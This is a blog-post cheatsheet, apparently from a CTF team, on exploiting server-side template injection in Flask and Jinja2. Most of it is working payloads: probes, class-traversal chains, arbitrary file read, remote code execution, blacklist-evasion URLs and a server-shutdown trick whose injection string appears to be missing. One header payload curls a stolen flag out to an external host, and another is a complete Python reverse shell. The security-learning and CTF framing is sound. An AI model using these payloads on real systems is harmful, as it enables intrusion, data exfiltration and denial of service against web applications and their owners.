---
layout: post
title: "Cheatsheet - Flask & Jinja2 SSTI"
category: cheatsheet
author: phosphore
---

## Flask & Jinja2 SSTI

### Introduction
While SSTI in Flask are nothing new, we recently stumbled upon several articles covering the subject in more or less detail because of a challenge in the recent TokyoWesterns CTF. This cheatsheet will introduce the basics of SSTI, along with some evasion techniques we gathered along the way from talks, blog posts, hackerone reports and direct experience.

### RTFM
As everything in this field, explore the docs of [Jinja](http://jinja.pocoo.org/docs/2.10/), [Flask](http://flask.pocoo.org/docs/1.0/api/) & Python and learn them by heart. Assuming this, I'm not going to explore in detail how does Flask/Jinja work, neither python internals.

### Reconnaissance
You can try to probe `{{7*'7'}}` to see if the target is vulnerable. It would result in 49 in Twig, 7777777 in Jinja2, and neither if no template language is in use. This step is sometimes as trivial as submitting invalid syntax, as template engines may identify themselves in the resulting error messages. Note that there are other methods to identify more template engines. [Tplmap](https://github.com/epinna/tplmap/) or its [Burp Suite Plugin](https://github.com/epinna/tplmap/blob/master/burp_extension/README.md) will do the trick. This guide will specifically focus on Jinja2.

### Basics
In python `__mro__` or `mro()` allows us to go back up the tree of inherited objects in the current Python environment, and `__subclasses__` lets us come back down. Read the [docs](https://docs.python.org/3/library/stdtypes.html?highlight=subclasses#class.__mro__) for more.
Basically, you can crawl up the inheritance tree of the known objects using `mro`, thus accessing *every class loaded* in the current python environment (!). 

The usual exploitation starts with the following: from a simple empty string `""` you will create a new-type object, type `str`. From there you can crawl up to the root object class using `__mro__`, then crawl back down to every new-style object in the Python environment using `__subclasses__`.

![__mro__ and __subclass__ example]({{site.url}}/assets/mro_subclass.png){: .center-image .half-image }

### Sinks
If you happen to have the source code of the application, look for the `flask.render_template_string(source, **context)` function. It is a common sink for SSTI in Jinja ([docs](http://flask.pocoo.org/docs/1.0/api/#template-rendering)).

### Context and Global Variables
There are several sources from which objects end up in the template context. Remember that there may be sensitive vars explicitly added by the developer, making the SSTI easier. You can use [this list](https://raw.githubusercontent.com/albinowax/SecLists/9309803f3f7d5c1e0b2f26721c1ea7ef36eeb1c8/Discovery/Web_Content/burp-parameter-names) by @albinowax to fuzz common variable names with Burp or Zap.
The following global variables are available within Jinja2 templates by default:
- `config`, the current configuration object
- `request`, the current request object
- `session`, the current session object
- `g`, the request-bound object for global variables. This is usually used by the developer to store resources during a request.

If you want to explore in major details their globals, here are the links to the API docs: [Flask](http://flask.pocoo.org/docs/1.0/templating/#standard-context) and [Jinja](http://jinja.pocoo.org/docs/dev/templates/#builtin-globals).

#### Introspection
You may conduct introspection with the `locals` object using `dir` and `help` to see everything that is available to the template context. You can also use introspection to reach every other application variable.  This [script]({{site.bloburl}}/assets/search.py) written by the [DoubleSigma](https://ctftime.org/writeup/10851) team will traverse over child attributes of request recursively. 
For example, if you need to reach the blacklisted `config` var you may access it anyway via:
```
{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']}}
```

### DoS
The `request.environ` object is a dictionary of objects related to the server environment. One such item in the dictionary is a method named `shutdown_server` assigned to the key `werkzeug.server.shutdown`. Injecting `''` should be enough to shut down the server.

### Extract classes from the application
Get all classes:
```
{{ [].class.base.subclasses() }}
```
```
{{''.class.mro()[1].subclasses()}}
```

### Arbitrary file read
In our context we can't use `''.__class__` as it is outside of the sandbox. So we need an object which has a class inherited from object. We can then leverage the `<type 'file'>` class to read arbitrary file. While `open` is the built-in function for creating file objects, the file class is also capable of instantiating file objects, and if we can instantiate a file object then we can use methods like `read` to extract the contents.
This injection will do the trick:
```
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40](\"/tmp/flag\").read() }}
```

Mind that index numbers may vary (i.e. [4],[40]) according to the environment.

### Remote code execution
##### First method
By using the `subprocess` class you may issue arbitrary commands. This may be version-dependent:
```
{{config.items()[4][1].__class__.__mro__[2].__subclasses__()[229]([\"touch /tmp/test\"], shell=True) }}
```
##### Second Method
Luckily, the config object comes with a function `from_pyfile()` which reads, compiles and then executes a python file. We now write arbitrary payloads by passing `request.headers['X-Payload']` to the `write` function and sending the `X-Payload` header:
```
GET /{{''.__class__.__mro__[2].__subclasses__()[40]('/tmp/pwn.py','w').write(request.headers['X-Payload'])}}-{{''.__class__.__mro__[2].__subclasses__()[40]('/tmp/pwn.py').read()}}-{{config.from_pyfile('/tmp/pwn.py')}} HTTP/1.1
Host: chal.ctf.net
[...]
X-Payload: import os;a=os.system("curl http://chal:8080/flag > /tmp/pwn.log");os.system("curl http://pequalsnp-team.github.io:8081/{}".format(open("/tmp/pwn.log").read().encode("hex")))
```
You could alternatively use the reverse shell payload from the [pentest monkey's cheat sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet):
```
X-Payload: import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",8099));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

### Filters bypass
Generally, if there is a blacklist you can use `request.args.param` to retrieve the value of a new param passed with the querystring. Likewise, you may trim parts of the URL using `request.url[n:]` (e.g.  `{{request[request.url[-6:]]}}&a=config` ).
I'll report some examples below:
##### Bypass the filtering on `__`:
```
http://localhost:5000/?exploit={{request[request.args.param]}}&param=__class__
```
#####  Bypass the filtering on `.` or `[]`:
Using [Jinja2 filters](http://jinja.pocoo.org/docs/2.10/templates/#list-of-builtin-filters) like `|attr()`:
```
http://localhost:5000/?exploit={{request|attr(request.args.param)}}&param=__class__
```
Remember that you can always use the `__getitem__` to achieve the same, getting an item by key or index.

##### Generic blacklist evasion
- Using the `|join` filter will concatenate a list of strings. Also, multiplication of a string with a number 'n' duplicates it 'n' times. You may use both tricks to get bypass.
- You can also use the `.getlist()` function to simplify the building of the injection. The function returns a list of all parameters with a given name. In our case we define the name using the l parameter and the content of the list with several a parameters.
```
http://localhost:5000/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_
```
- There is another method to concatenate strings and with the `|format` filter. With the same query-string parameters `&a=_` we can form a format string that will result in `__class__`: `%s%sclass%s%s`. The `%s` identifiers will be replaced with the passed string:
```
http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_
```
- You may also use request.cookies, request.headers, request.environ, request.values to store blacklisted injection values.
- For string concatenation, have a look-see at the `~` operator. `{{ "Hello " ~ name ~ "!" }}` would return (assuming _name_ is set to `'John'`): `Hello John!`.

### Tools
- Tplmap is a tool by [@epinna](https://github.com/epinna), which assists the exploitation of Code Injection and Server-Side Template Injection vulnerabilities with a number of sandbox escape techniques to get access to the underlying operating system. It can exploit several code context and blind injection scenarios. It also supports `eval()`-like code injections in Python, Ruby, PHP, Java and generic unsandboxed template engines. [Github](https://github.com/epinna/tplmap)

- search.py is a script written by [DoubleSigma](https://ctftime.org/writeup/10851). It traverse over child attributes of request recursively. [Link]({{site.bloburl}}/assets/search.py).

### Useful links
- Shrine challenge, TokyoWesterns CTF 2018 [Link](https://ctftime.org/writeup/10851)
- Exploring SSTI in Flask/Jinja2 [Part 1](https://nvisium.com/blog/2016/03/09/exploring-ssti-in-flask-jinja2.html) | [Part 2](https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii.html)
- Server-Side Template Injection: RCE for the modern webapp, J. Kettle [PDF Link](https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)
- Jinja2 template injection filter bypasses, S. Neef [Link](https://0day.work/jinja2-template-injection-filter-bypasses/)
